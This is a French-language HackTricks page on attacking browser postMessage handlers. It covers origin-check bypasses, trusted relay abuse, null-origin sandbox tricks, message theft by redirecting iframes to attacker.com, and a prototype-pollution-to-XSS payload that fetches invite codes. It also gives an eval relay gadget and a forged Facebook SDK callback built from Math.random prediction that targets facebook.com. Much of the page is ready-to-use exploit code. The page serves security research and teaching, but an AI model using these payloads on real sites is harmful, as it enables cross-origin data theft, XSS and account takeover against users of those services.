# Vulnérabilités PostMessage

{{#include ../../banners/hacktricks-training.md}}

## Envoi de **PostMessage**

**PostMessage** utilise la fonction suivante pour envoyer un message :
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Notez que **targetOrigin** peut être '\*' ou une URL comme _https://company.com._\  
Dans le **deuxième scénario**, le **message ne peut être envoyé qu'à ce domaine** (même si l'origine de l'objet Window est différente).\  
Si le **wildcard** est utilisé, **les messages peuvent être envoyés à n'importe quel domaine**, et seront envoyés à l'origine de l'objet Window.

### Attaquer un iframe & wildcard dans **targetOrigin**

Comme expliqué dans [**this report**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) si vous trouvez une page pouvant être **iframed** (pas de protection `X-Frame-Header`) et qui **envoie des messages sensibles** via **postMessage** en utilisant un **wildcard** (\*), vous pouvez **modifier** l'**origine** de l'**iframe** et **leak** le **message sensible** vers un domaine contrôlé par vous.\  
Notez que si la page peut être iframed mais que le **targetOrigin** est **réglé sur une URL et non sur un wildcard**, cette **astuce ne fonctionnera pas**.
```html
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener exploitation

**`addEventListener`** est la fonction utilisée par JS pour déclarer la fonction qui est **en attente de `postMessages`**.\ Un code similaire au suivant sera utilisé:
```javascript
window.addEventListener(
"message",
(event) => {
if (event.origin !== "http://example.org:8080") return

// ...
},
false
)
```
Notez dans ce cas comment la **première chose** que fait le code est de **vérifier l'origin**. C'est terriblement **important** surtout si la page va faire **quelque chose de sensible** avec l'information reçue (par exemple changer un mot de passe). **Si elle ne vérifie pas l'origin, des attaquants peuvent faire envoyer aux victimes des données arbitraires à ces endpoints** et changer les mots de passe des victimes (dans cet exemple).

### Enumeration

Pour **trouver event listeners** sur la page courante, vous pouvez :

- **Rechercher** dans le code JS `window.addEventListener` et `$(window).on` (_JQuery version_)
- **Exécuter** dans la console des devtools : `getEventListeners(window)`

![](<../../images/image (618) (1).png>)

- **Aller à** _Elements --> Event Listeners_ dans les developer tools du navigateur

![](<../../images/image (396).png>)

- Utiliser une **browser extension** comme [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) ou [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). Ces extensions vont **intercepter tous les messages** et vous les afficher.

### Origin check bypasses

- **`event.isTrusted`** attribute est considéré comme sûr car il renvoie `True` uniquement pour les events générés par de véritables actions utilisateur. Bien qu'il soit difficile à bypasser s'il est implémenté correctement, son importance dans les vérifications de sécurité est notable.
- L'utilisation de **`indexOf()`** pour la validation de l'origin dans les événements PostMessage peut être susceptible de bypass. Un exemple illustrant cette vulnérabilité est :

```javascript
"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")
```

- La méthode **`search()`** de `String.prototype.search()` est destinée aux expressions régulières, pas aux strings. Passer autre chose qu'un regexp conduit à une conversion implicite en regex, rendant la méthode potentiellement peu sûre. En regex, le point (.) agit comme un joker, permettant de contourner la validation avec des domaines spécialement conçus. Par exemple :

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- La fonction **`match()`**, similaire à `search()`, traite des regex. Si le regex est mal structuré, il peut être sujet à des contournements.
- La fonction **`escapeHtml`** est censée assainir les entrées en échappant les caractères. Cependant, elle ne crée pas un nouvel objet échappé mais écrase les propriétés de l'objet existant. Ce comportement peut être exploité. En particulier, si un objet peut être manipulé de sorte que sa propriété contrôlée n'hérite pas de `hasOwnProperty`, `escapeHtml` ne fonctionnera pas comme prévu. Cela est démontré dans les exemples ci-dessous :

- Échec attendu :

```javascript
result = u({
message: "'\"<b>\\",
})
result.message // "&#39;&quot;&lt;b&gt;\"
```

- Contournement de l'échappement :

```javascript
result = u(new Error("'\"<b>\\"))
result.message // "'"<b>\"
```

Dans le contexte de cette vulnérabilité, l'objet `File` est particulièrement exploitable en raison de sa propriété en lecture seule `name`. Cette propriété, lorsqu'elle est utilisée dans des templates, n'est pas assainie par la fonction `escapeHtml`, ce qui entraîne des risques de sécurité potentiels.

- La propriété `document.domain` en JavaScript peut être définie par un script pour raccourcir le domaine, permettant un assouplissement de la same-origin policy au sein du même domaine parent.

### Origin-only trust + trusted relays

Si un récepteur ne vérifie que **`event.origin`** (par ex., fait confiance à n'importe quel `*.trusted.com`) vous pouvez souvent trouver une page **"relay"** sur cette origine qui renvoie des params contrôlés par l'attaquant via `postMessage` vers un `targetOrigin`/`targetWindow` fourni. Des exemples incluent des gadgets marketing/analytics qui prennent des query params et transmettent `{msg_type, access_token, ...}` à `opener`/`parent`. Vous pouvez :

- **Ouvrir** la page victime dans un popup/iframe qui a un `opener` afin que ses handlers s'enregistrent (beaucoup de pixels/SDKs n'attachent des listeners que lorsque `window.opener` existe).
- **Naviguer** une autre fenêtre attaquante vers le endpoint relay sur l'origine de confiance, en remplissant les champs du message que vous voulez injecter (type de message, tokens, nonces).
- Parce que le message provient maintenant **de l'origine de confiance**, la validation basée uniquement sur l'origin passe et vous pouvez déclencher des comportements privilégiés (changements d'état, appels API, écritures DOM) dans le listener de la victime.

Modes d'abus observés sur le terrain :

- Les Analytics SDKs (par ex., style pixel/fbevents) consomment des messages comme `FACEBOOK_IWL_BOOTSTRAP`, puis **appellent des APIs backend en utilisant un token fourni dans le message** et incluent **`location.href` / `document.referrer`** dans le corps de la requête. Si vous fournissez votre propre token, vous pouvez **lire ces requêtes dans l'historique/logs de requêtes du token** et exfiltrer des codes/tokens OAuth présents dans l'URL/referrer de la page victime.
- Tout relay qui reflète des champs arbitraires dans `postMessage` vous permet de **usurper des types de message** attendus par des listeners privilégiés. Combinez cela avec une validation d'entrée faible pour atteindre des appels Graph/REST, des déverrouillages de fonctionnalités, ou des flux équivalents à du CSRF.

Conseils de recherche : énumérez les `postMessage` listeners qui ne vérifient que `event.origin`, puis cherchez des endpoints HTML/JS de la même origine qui transmettent des params d'URL via `postMessage` (aperçus marketing, popups de login, pages d'erreur OAuth). Assemblez les deux avec `window.open()` + `postMessage` pour contourner les vérifications d'origin.

### e.origin == window.origin bypass

Lors de l'inclusion d'une page web dans un **iframe sandboxed** en utilisant %%%%%%, il est crucial de comprendre que l'origin de l'iframe sera définie sur null. Ceci est particulièrement important lorsqu'on considère les attributs sandbox et leurs implications sur la sécurité et le fonctionnement.

En spécifiant **`allow-popups`** dans l'attribut sandbox, tout popup ouvert depuis l'iframe hérite des restrictions sandbox de son parent. Cela signifie que, à moins que l'attribut **`allow-popups-to-escape-sandbox`** soit également inclus, l'origin de la fenêtre popup est également définie sur `null`, s'alignant sur l'origin de l'iframe.

En conséquence, lorsqu'un popup est ouvert dans ces conditions et qu'un message est envoyé depuis l'iframe vers le popup en utilisant **`postMessage`**, les deux côtés, émetteur et récepteur, ont leur origin à `null`. Ceci conduit à une situation où **`e.origin == window.origin`** évalue à vrai (`null == null`), car l'iframe et le popup partagent la même valeur d'origin `null`.

Pour plus d'informations **lire** :


{{#ref}}
bypassing-sop-with-iframes-1.md
{{#endref}}

### Bypassing e.source

Il est possible de vérifier si le message provient de la même fenêtre dans laquelle le script écoute (particulièrement intéressant pour les **Content Scripts from browser extensions** pour vérifier si le message a été envoyé depuis la même page) :
```javascript
// If it’s not, return immediately.
if (received_message.source !== window) {
return
}
```
Vous pouvez forcer **`e.source`** d'un message à null en créant un **iframe** qui **envoie** le **postMessage** et est **immédiatement supprimé**.

Pour plus d'informations **lire :**


{{#ref}}
bypassing-sop-with-iframes-2.md
{{#endref}}

### X-Frame-Header bypass

Pour réaliser ces attaques, idéalement vous pourrez **mettre la page web victime** à l'intérieur d'un `iframe`. Mais certains en-têtes comme `X-Frame-Header` peuvent **empêcher** ce **comportement**.\
Dans ces scénarios, vous pouvez toujours utiliser une attaque moins discrète. Vous pouvez ouvrir un nouvel onglet vers l'application web vulnérable et communiquer avec elle:
```html
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Voler le message envoyé à l'iframe enfant en bloquant la page principale

Dans la page suivante vous pouvez voir comment vous pourriez voler des **données postmessage sensibles** envoyées à une **iframe enfant** en **bloquant** la **page principale** avant l'envoi des données et en abusant d'un **XSS dans l'iframe enfant** pour **leak** les données avant qu'elles ne soient reçues :


{{#ref}}
blocking-main-page-to-steal-postmessage.md
{{#endref}}

### Voler un message en modifiant la location de l'iframe

Si vous pouvez embarquer une page web dans une iframe sans X-Frame-Header qui contient une autre iframe, vous pouvez **changer la location de cette iframe enfant**, donc si elle reçoit un **postmessage** envoyé en utilisant un **wildcard**, un attaquant pourrait **changer** l'**origin** de cette iframe vers une page **contrôlée** par lui et **voler** le message :


{{#ref}}
steal-postmessage-modifying-iframe-location.md
{{#endref}}

### postMessage vers Prototype Pollution et/ou XSS

Dans des scénarios où les données envoyées via `postMessage` sont exécutées par du JS, vous pouvez embarquer la **page** dans une **iframe** et **exploiter** la **Prototype Pollution/XSS** en envoyant l'exploit via `postMessage`.

Un excellent article expliquant l'XSS via `postMessage` est disponible ici : [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)

Exemple d'un exploit pour abuser de **Prototype Pollution puis d'XSS** via un `postMessage` vers une `iframe`:
```html
<html>
<body>
<iframe
id="idframe"
src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document
.getElementById("iframe_victim")
.contentWindow.postMessage(
'{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\" />"}}}',
"*"
)
document
.getElementById("iframe_victim")
.contentWindow.postMessage(JSON.stringify("refresh"), "*")
}

setTimeout(get_code, 2000)
</script>
</body>
</html>
```
Pour **plus d'informations** :

- Link to page about [**prototype pollution**](../deserialization/nodejs-proto-prototype-pollution/index.html)
- Link to page about [**XSS**](../xss-cross-site-scripting/index.html)
- Link to page about [**client side prototype pollution to XSS**](../deserialization/nodejs-proto-prototype-pollution/index.html#client-side-prototype-pollution-to-xss)

### Chargement de scripts dérivés de l'origine et pivot de la supply-chain (étude de cas CAPIG)

`capig-events.js` n'a enregistré un gestionnaire `message` que lorsque `window.opener` existait. Lors de `IWL_BOOTSTRAP`, il vérifiait `pixel_id` mais stockait `event.origin` et l'utilisait ensuite pour construire `${host}/sdk/${pixel_id}/iwl.js`.

<details>
<summary>Gestionnaire écrivant une origine contrôlée par l'attaquant</summary>
```javascript
if (window.opener) {
window.addEventListener("message", (event) => {
if (
!localStorage.getItem("AHP_IWL_CONFIG_STORAGE_KEY") &&
!localStorage.getItem("FACEBOOK_IWL_CONFIG_STORAGE_KEY") &&
event.data.msg_type === "IWL_BOOTSTRAP" &&
checkInList(g.pixels, event.data.pixel_id) !== -1
) {
localStorage.setItem("AHP_IWL_CONFIG_STORAGE_KEY", {
pixelID: event.data.pixel_id,
host: event.origin,
sessionStartTime: event.data.session_start_time,
})
startIWL() // loads `${host}/sdk/${pixel_id}/iwl.js`
}
})
}
```
</details>

**Exploit (origin → script-src pivot):**
1. Obtenir un opener : p.ex., dans Facebook Android WebView réutiliser `window.name` avec `window.open(target, name)` pour que la fenêtre devienne son propre opener, puis envoyer un message depuis un iframe malveillant.
2. Envoyer `IWL_BOOTSTRAP` depuis n'importe quelle origine pour persister `host = event.origin` dans `localStorage`.
3. Héberger `/sdk/<pixel_id>/iwl.js` sur n'importe quelle origine autorisée par la CSP (takeover/XSS/upload sur un domaine analytics en liste blanche). `startIWL()` charge alors du JS d'attaquant dans le site embarquant (p.ex. `www.meta.com`), permettant des requêtes cross-origin authentifiées et la prise de contrôle de comptes.

Si le contrôle direct de l'opener était impossible, compromettre un iframe tiers sur la page permettait néanmoins d'envoyer le `postMessage` forgé au parent pour empoisonner l'hôte stocké et forcer le chargement du script.

**Backend-generated shared script → stored XSS:** le plugin `AHPixelIWLParametersPlugin` concaténait les paramètres de règle utilisateur dans du JS ajouté à `capig-events.js` (p.ex., `cbq.config.set(...)`). L'injection de breakouts comme `"]}` permettait d'insérer du JS arbitraire, créant un stored XSS dans le script partagé servi à tous les sites qui le chargent.

### La liste d'origines de confiance n'est pas une frontière

Une vérification stricte de `event.origin` ne fonctionne que si l'**origine de confiance ne peut pas exécuter de JS d'attaquant**. Lorsque des pages privilégiées embarquent des iframes tiers et supposent que `event.origin === "https://partner.com"` est sûr, tout XSS sur `partner.com` devient un pont vers le parent :
```javascript
// Parent (trusted page)
window.addEventListener("message", (e) => {
if (e.origin !== "https://partner.com") return
const [type, html] = e.data.split("|")
if (type === "Partner.learnMore") target.innerHTML = html // DOM XSS
})
```
Schéma d'attaque observé sur le terrain:

1. **Exploit XSS in the partner iframe** and drop a relay gadget so any `postMessage` becomes code exec inside the trusted origin:
```html
<img src="" onerror="onmessage=(e)=>{eval(e.data.cmd)};">
```
2. **Depuis la page attaquante**, envoyez du JS vers l'iframe compromis qui relaie un type de message autorisé vers la fenêtre parent. Le message provient de `partner.com`, passe l'allowlist, et transporte du HTML qui est inséré de manière non sécurisée :
```javascript
postMessage({
cmd: `top.frames[1].postMessage('Partner.learnMore|<img src="" onerror="alert(document.domain)">|b|c', '*')`
}, "*")
```
3. Le parent injecte le HTML de l'attaquant, donnant **JS execution in the parent origin** (e.g., `facebook.com`), ce qui peut ensuite être utilisé pour voler des codes OAuth ou aboutir à une compromission complète de compte.

Key takeaways:

- **Partner origin isn't a boundary**: toute XSS dans un partenaire « trusted » permet aux attaquants d'envoyer des messages autorisés qui contournent les vérifications `event.origin`.
- Handlers that **render partner-controlled payloads** (e.g., `innerHTML` on specific message types) transforment une compromission du partenaire en un same-origin DOM XSS.
- A wide **message surface** (many types, no structure validation) offre plus de gadgets pour pivoter une fois qu'un iframe partenaire est compromis.

### Prédire les tokens de callback **`Math.random()`** dans les postMessage bridges

When message validation uses a “shared secret” generated with `Math.random()` (e.g., `guid() { return "f" + (Math.random() * (1<<30)).toString(16).replace(".", "") }`) and the same helper also names plugin iframes, you can recover PRNG outputs and forge trusted messages:

- **Leak PRNG outputs via `window.name`:** Le SDK auto-names plugin iframes with `guid()`. Si vous contrôlez la top frame, iframez la page victime, puis naviguez le plugin iframe vers votre origin (e.g., `window.frames[0].frames[0].location='https://attacker.com'`) et lisez `window.frames[0].frames[0].name` pour obtenir une sortie brute de `Math.random()`.
- **Force more outputs without reloads:** Certains SDK exposent un chemin de reinit ; dans le FB SDK, firing `init:post` avec `{xfbml:1}` force `XFBML.parse()`, détruit/recrée le plugin iframe, et génère de nouveaux names/callback IDs. Des reinit répétés produisent autant de sorties PRNG que nécessaire (notez des appels internes supplémentaires à `Math.random()` pour les callback/iframe IDs, donc les solveurs doivent sauter les valeurs intermédiaires).
- **Trusted-origin delivery via parameter pollution:** Si un endpoint de plugin first-party reflète un paramètre non désinfecté dans le payload cross-window (e.g., `/plugins/feedback.php?...%23relation=parent.parent.frames[0]%26cb=PAYLOAD%26origin=TARGET`), vous pouvez injecter `&type=...&iconSVG=...` tout en conservant l'origin trusted `facebook.com`.
- **Predict the next callback:** Convert leaked iframe names back to floats in `[0,1)` et injectez plusieurs valeurs (même non consécutives) dans un prédicteur V8 `Math.random` (e.g., Z3-based). Générez localement le prochain `guid()` pour forger le token de callback attendu.
- **Trigger the sink:** Craft the postMessage data pour que le bridge dispatch `xd.mpn.setupIconIframe` et injecte du HTML dans `iconSVG` (e.g., URL-encoded `<img src=x onerror=...>`), obtenant un DOM XSS à l'intérieur de l'origin hébergeant ; depuis là, les iframes same-origin (OAuth dialogs, arbiters, etc.) peuvent être lus.
- **Framing quirks help:** La chaîne nécessite du framing. Dans certains webviews mobiles, `X-Frame-Options` peut se dégrader en unsupported `ALLOW-FROM` quand `frame-ancestors` est présent, et des paramètres “compat” peuvent forcer des `frame-ancestors` permissifs, activant le `window.name` side channel.

#### Exemple minimal de message forgé
```javascript
// predictedFloat is the solver output for the next Math.random()
const callback = "f" + (predictedFloat * (1 << 30)).toString(16).replace(".", "")
const payload =
callback +
"&type=mpn.setupIconIframe&frameName=x" +
"&iconSVG=%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e"
const fbMsg = `https://www.facebook.com/plugins/feedback.php?api_key&channel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=42%23relation=parent.parent.frames[0]%26cb=${encodeURIComponent(payload)}%26origin=https://www.facebook.com`
iframe.location = fbMsg // sends postMessage from facebook.com with forged callback
```
## Références

- [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)
- [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
- [Leaking fbevents: exfiltration de code OAuth via la confiance postMessage menant à un ATO Instagram](https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html)
- Pour pratiquer : [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)
- [CAPIG postMessage origin trust → script loading + stored JS injection](https://ysamm.com/uncategorized/2025/01/13/capig-xss.html)
- [Self XSS Facebook Payments](https://ysamm.com/uncategorized/2026/01/15/self-xss-facebook-payments.html)
- [Facebook JavaScript SDK Math.random callback prediction → DOM XSS writeup](https://ysamm.com/uncategorized/2026/01/17/math-random-facebook-sdk.html)
- [V8 Math.random() state recovery (Z3 predictor)](https://github.com/PwnFunction/v8-randomness-predictor)

{{#include ../../banners/hacktricks-training.md}}
